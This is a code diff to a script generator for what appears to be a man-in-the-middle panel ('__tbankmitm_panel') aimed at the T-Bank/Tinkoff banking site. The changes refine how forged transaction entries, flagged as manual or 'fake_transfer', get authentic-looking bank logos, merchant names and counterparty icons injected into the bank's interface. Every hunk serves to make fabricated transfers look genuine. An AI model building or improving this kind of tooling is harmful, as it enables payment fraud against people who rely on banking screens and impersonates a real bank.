@@ -3113,6 +3113,12 @@ def _build_script() -> str:
     }}
   }}
 
+  function isGenericTransferLogo(url) {{
+    const s = String(url || '').trim().toLowerCase();
+    if (!s) return true;
+    return s.indexOf('transfers-c1') !== -1 || s.indexOf('dhjhbnNmzxjzlwm'.toLowerCase()) !== -1;
+  }}
+
   function appLogoUrl(url) {{
     let raw = String(url || '').trim();
     if (!raw) return '';
@@ -3124,20 +3130,14 @@ def _build_script() -> str:
     }}
     const proxied = toImgproxy(raw);
     if (!proxied) return '';
+    const path = '/__tbankmitm_panel/panel-bank-logo?u=' + encodeURIComponent(proxied);
     try {{
       const h = String(location.hostname || '').toLowerCase();
-      const isTbankOnline = h.indexOf('tbank-online.com') !== -1;
-      const isDirectTbankCdn = /^https:\\/\\/(?:imgproxy\\.cdn-tinkoff\\.ru|brands-prod\\.cdn-tinkoff\\.ru|brands-static\\.cdn-tinkoff\\.ru|bms-logo-prod\\.t-static\\.ru|cdn\\.tbank\\.ru|acdn\\.tinkoff\\.ru|static\\.tbank\\.ru|static\\.tinkoff\\.ru|sso-forms-prod\\.t-static\\.ru)\\//i.test(proxied);
-      if (!isTbankOnline && isDirectTbankCdn) {{
-        return proxied;
-      }}
-      const path = '/__tbankmitm_panel/panel-bank-logo?u=' + encodeURIComponent(proxied);
-      if (location.protocol === 'https:' && (isTbankOnline || h.endsWith('tbank.ru') || h.indexOf('tinkoff.ru') !== -1)) {{
+      if (location.protocol === 'https:' && (h.indexOf('tbank-online.com') !== -1 || h.endsWith('tbank.ru') || h.indexOf('tinkoff.ru') !== -1)) {{
         return String(location.origin).replace(/\\/$/, '') + path;
       }}
-      return path;
     }} catch (_) {{}}
-    return '/__tbankmitm_panel/panel-bank-logo?u=' + encodeURIComponent(proxied);
+    return path;
   }}
 
   function presetMeta(key) {{
@@ -3206,10 +3206,22 @@ def _build_script() -> str:
     const typ = op.type === 'Credit' ? 'Credit' : 'Debit';
     const preset = presetMeta(op.bank_preset || 'custom');
     const primary = String(op.title || op.description || op.phone || (typ === 'Debit' ? 'Перевод' : 'Поступление')).trim();
-    const bankName = String(op.bank || preset.name || 'Переводы').trim();
-    const logo = appLogoUrl(
-      (op.app_logo || '').trim() || op.logo || preset.logo || presetMeta('sbp').logo || ''
-    );
+    const bankName = String(op.bank || preset.name || 'Переводы').replace(/\\+/g, ' ').trim();
+    const existingNodeLogo = String(
+      (node.brand && (node.brand.logo || node.brand.fileLink))
+      || (node.merchant && (node.merchant.logo || node.merchant.logoUrl))
+      || node.icon
+      || node.logo
+      || ''
+    ).trim();
+    let candidateLogo = (op.app_logo || '').trim() || op.logo || preset.logo || '';
+    if ((!candidateLogo || isGenericTransferLogo(candidateLogo)) && existingNodeLogo && !isGenericTransferLogo(existingNodeLogo)) {{
+      candidateLogo = existingNodeLogo;
+    }}
+    if (!candidateLogo) {{
+      candidateLogo = presetMeta('sbp').logo || '';
+    }}
+    const logo = appLogoUrl(candidateLogo);
     if (!logo) return;
     node.brand = Object.assign({{}}, node.brand || {{}}, {{
       id: '11250',
@@ -3219,9 +3231,14 @@ def _build_script() -> str:
       baseColor: 'f12e16'
     }});
     node.icon = logo;
-    if (node.merchant && typeof node.merchant === 'object') {{
+    if (!node.merchant || typeof node.merchant !== 'object') {{
+      node.merchant = {{ name: bankName }};
+    }} else if (bankName) {{
       node.merchant.name = bankName;
-      setLogo(node.merchant, logo);
+    }}
+    setLogo(node.merchant, logo);
+    if (node.counterparty && typeof node.counterparty === 'object') {{
+      setLogo(node.counterparty, logo);
     }}
     setLogo(node, logo);
   }}
@@ -3685,8 +3702,12 @@ def _build_script() -> str:
       if (isManualOrFake) {{
         const presetKey = String(enriched.bank_preset || (prev && prev.bank_preset) || (row.fake_transfer ? 'sbp' : 'custom')).toLowerCase();
         const pm = presetMeta(presetKey);
-        if (!enriched.app_logo && prev && prev.app_logo) enriched.app_logo = prev.app_logo;
-        if (!enriched.logo && prev && prev.logo) enriched.logo = prev.logo;
+        if ((!enriched.app_logo || isGenericTransferLogo(enriched.app_logo)) && prev && prev.app_logo && !isGenericTransferLogo(prev.app_logo)) {{
+          enriched.app_logo = prev.app_logo;
+        }}
+        if ((!enriched.logo || isGenericTransferLogo(enriched.logo)) && prev && prev.logo && !isGenericTransferLogo(prev.logo)) {{
+          enriched.logo = prev.logo;
+        }}
         if (!enriched.logo && !enriched.app_logo && pm && pm.logo) enriched.logo = pm.logo;
         if (!enriched.title && row.desc) enriched.title = row.desc;
         if (row.comment !== undefined && row.comment !== null) {{
